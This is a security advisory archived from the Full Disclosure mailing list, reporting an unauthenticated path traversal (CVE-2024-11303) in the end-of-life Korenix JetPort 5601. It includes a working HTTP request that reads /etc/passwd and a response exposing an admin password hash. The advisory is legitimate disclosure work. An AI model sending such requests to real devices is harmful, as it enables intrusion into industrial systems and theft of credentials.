---
title: St. Poelten UAS | Path Traversal in Korenix JetPort 5601
url: https://seclists.org/fulldisclosure/2024/Nov/8
source: Full Disclosure
date: 2024-11-22
fetch_date: 2025-10-06T19:23:04.936388
---

# St. Poelten UAS | Path Traversal in Korenix JetPort 5601

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](7)
[By Date](date.html#8)
[![Next](/images/right-icon-16x16.png)](9)

[![Previous](/images/left-icon-16x16.png)](7)
[By Thread](index.html#8)
[![Next](/images/right-icon-16x16.png)](9)

![](/shared/images/nst-icons.svg#search)

# St. Poelten UAS | Path Traversal in Korenix JetPort 5601

---

*From*: Weber Thomas via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Tue, 19 Nov 2024 10:10:33 +0000

---

```
St. Pölten UAS 20241118-1
-------------------------------------------------------------------------------
                title| Path Traversal
              product| Korenix JetPort 5601
   vulnerable version| 1.2
        fixed version| -
           CVE number| CVE-2024-11303
               impact| High
             homepage| https://www.korenix.com/
                found| 2024-05-24
                   by| P. Oberndorfer, B. Tösch, M. Narbeshuber-Spletzer,
                     | C. Hierzer, M. Pammer
                     | These vulnerabilities were discovery during research at
                     | St.Pölten UAS, supported and coordinated by CyberDanube.
                     |
                     | https://fhstp.ac.at | https://cyberdanube.com
-------------------------------------------------------------------------------

Vendor description
-------------------------------------------------------------------------------
"Korenix Technology, a Beijer group company within the Industrial Communication
business area, is a global leading manufacturer providing innovative, market-
oriented, value-focused Industrial Wired and Wireless Networking Solutions.
With decades of experiences in the industry, we have developed various product
lines [...].

Our products are mainly applied in SMART industries: Surveillance, Machine-to-
Machine, Automation, Remote Monitoring, and Transportation. Worldwide customer
base covers different Sales channels, including end-customers, OEMs, system
integrators, and brand label partners. [...]"

Source: https://www.korenix.com/en/about/index.aspx?kind=3

Vulnerable versions
-------------------------------------------------------------------------------
Korenix JetPort 5601v3 / v1.2

Vulnerability overview
-------------------------------------------------------------------------------
1) Path Traversal (CVE-2024-11303)
A path traversal attack for unauthenticated users is possible. This allows
getting access to the operating system of the device and access information
like configuration files and connections to other hosts or potentially other
sensitive information.

Proof of Concept
-------------------------------------------------------------------------------
1) Path Traversal (CVE-2024-11303)
By sending the following request to the following endpoint, a path traversal
vulnerability can be triggered:
-------------------------------------------------------------------------------
GET /%2e%2e/%2e%2e/etc/passwd HTTP/1.1
Host: 10.69.10.2
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: de,en-US;q=0.7,en;q=0.3
Te: trailers
Connection: keep-alive
-------------------------------------------------------------------------------
Note, that this is only possible when an interceptor proxy or a command line
tool is used. A web browser would encode the characters and the path traversal
would not work.
The response to the latter request is shown below:
-------------------------------------------------------------------------------
HTTP/1.1 200 OK
Server: thttpd/2.19-MX Jun  2 2022
Content-type: text/plain; charset=iso-8859-1
[...]
Accept-Ranges: bytes
Connection: Keep-Alive
Content-length: 86

root::0:0:root:/root:/bin/false
admin:$1$$CoERg7ynjYLsj2j4glJ34.:502:502::/:/bin/true
-------------------------------------------------------------------------------

The vulnerabilities were manually verified on an emulated device by using the
MEDUSA scalable firmware runtime (https://medusa.cyberdanube.com).

Solution
-------------------------------------------------------------------------------
None. Device is End-of-Life.

Workaround
-------------------------------------------------------------------------------
Limit the access to the device and place it within a segmented network.

Recommendation
-------------------------------------------------------------------------------
CyberDanube recommends Korenix customers to upgrade to another device.

Contact Timeline
-------------------------------------------------------------------------------
2024-09-23: Contacting Beijer Electronics Group via cs () beijerelectronics com.
2024-09-24: Vendor stated, that the device is end-of-life. Contact will ask the
            engineering team if there are any changes.
2024-10-15: Vendor stated, that the advisory can be published. No further
            updates are planned for this device.
2024-11-18: Coordinated disclosure of advisory.

Web: https://www.fhstp.ac.at/
Twitter: https://x.com/fh_stpoelten
Mail: mis () fhstp ac at

EOF T. Weber / @2024

_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](7)
[By Date](date.html#8)
[![Next](/images/right-icon-16x16.png)](9)

[![Previous](/images/left-icon-16x16.png)](7)
[By Thread](index.html#8)
[![Next](/images/right-icon-16x16.png)](9)

### Current thread:

* **St. Poelten UAS | Path Traversal in Korenix JetPort 5601** *Weber Thomas via Fulldisclosure (Nov 21)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")